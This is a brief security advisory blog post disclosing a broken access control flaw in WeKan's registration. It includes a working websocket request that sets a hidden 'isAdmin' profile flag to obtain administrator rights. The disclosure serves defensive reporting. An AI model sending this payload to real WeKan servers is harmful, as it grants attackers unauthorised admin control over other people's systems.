---
title: "Broken Access Control in WeKan"
date: 2024-04-07
draft: false
authors: ["blocki"]
tags: ["advisory"]
description: "Broken Access Control vulnerability in WeKan"
featuredImage: "/alert.jpg"
featuredImagePreview: "/alert_crop.png"
---

Wekan is an open-source, collaborative project management application designed to help teams organize and manage their tasks and projects effectively. It is based on the Kanban methodology, which visualizes work on a board, with cards representing tasks that move through different stages of progress.

In the registration process of Wekan, a broken access control vulnerability was found, that allows arbitrary users to add their admin status and thus escalate their privileges directly to highest priviliges.

<!--more-->

WeKan uses websockets. During the registration, a request similar to the one below is created by the application:

```json
["{\"msg\":\"method\",\"id\":\"12\",\"method\":\"ATCreateUserServer\",\"params\":[{\"username\":\"testuser\",\"email\":\"testuser@local.host\",\"password\":{\"digest\":\"494a715f7e9b4071aca61bac42ca858a309524e5864f0920030862a4ae7589be\",\"algorithm\":\"sha-256\"},\"profile\":{}}]}"]
```

The `profile` key accepts a dictionary with a *hidden* attribute `isAdmin`. If the value is provided and set to `true`, the user receives high priviliges.

A modified request is shown below.
```json
["{\"msg\":\"method\",\"id\":\"12\",\"method\":\"ATCreateUserServer\",\"params\":[{\"username\":\"testuser\",\"email\":\"testuser@local.host\",\"password\":{\"digest\":\"494a715f7e9b4071aca61bac42ca858a309524e5864f0920030862a4ae7589be\",\"algorithm\":\"sha-256\"},\"profile\":{\"isAdmin\":true}}]}"]
```


The vulnerability was submitted to the *WeKan* team on 2023-07-30.
